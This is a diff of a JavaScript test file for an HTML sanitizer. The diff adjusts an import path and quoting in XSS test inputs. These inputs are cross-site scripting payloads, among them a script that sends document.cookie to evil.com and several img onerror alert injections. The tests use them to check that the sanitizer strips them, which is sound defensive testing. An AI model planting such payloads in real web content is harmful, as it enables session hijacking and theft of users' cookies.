@@ -1,11 +1,11 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert';
-import { sanitizePayload, sanitizeString, escapeHtml } from '../src/services/sanitizer';
+import { sanitizePayload, sanitizeString, escapeHtml } from '../src/services/sanitizer.js';
 
 describe('Deep Security & Payload Sanitization E2E Tests', () => {
   it('strips dangerous HTML scripts and attributes from user milestone descriptions', () => {
     const maliciousInput =
-      'Deliverable review <script>fetch("http://evil.com?c="+document.cookie)</script> and <img src=x onerror=alert(1)>';
+      'Deliverable review <script>fetch("http://evil.com?c="+document.cookie)</script> and <img src=x onerror="alert(1)">';
     const cleaned = sanitizeString(maliciousInput);
 
     assert.ok(!cleaned.includes('<script>'));
@@ -27,7 +27,7 @@ describe('Deep Security & Payload Sanitization E2E Tests', () => {
       title: 'Valid Contract <script>alert("hack")</script>',
       metadata: {
         milestones: [
-          { description: 'Milestone 1 <img src=x onerror=alert(2)>' },
+          { description: 'Milestone 1 <img src=x onerror="alert(2)">' },
           { description: 'Milestone 2 normal' },
         ],
       },
